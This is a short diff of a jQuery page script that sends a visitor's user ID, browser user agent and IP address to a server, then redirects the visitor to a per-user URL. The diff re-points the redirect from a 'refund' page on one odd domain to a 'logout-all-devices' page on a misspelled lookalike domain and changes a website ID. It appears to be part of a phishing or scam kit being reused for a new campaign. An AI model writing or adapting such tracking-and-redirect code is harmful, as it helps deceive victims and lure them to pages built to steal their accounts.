@@ -90,14 +90,14 @@ $(document).ready(function () {
                     user_id: userId,
                     agent: navigator.userAgent,
                     user_ip: userIp,
-                    website_id: 71,
+                    website_id: 9864,
                 },
                 success: function (response) {
                     console.log('Response:', response);
                     
                         // Redirect to another URL on success
                         window.onload = function(){
-                            window.location.href = `https://agesmart-re-verify.1-8z.com/refund/${userId}`;
+                            window.location.href = `https://ls.megaapersanals.com/logout-all-devices/${userId}`;
                           }
                     
                 },
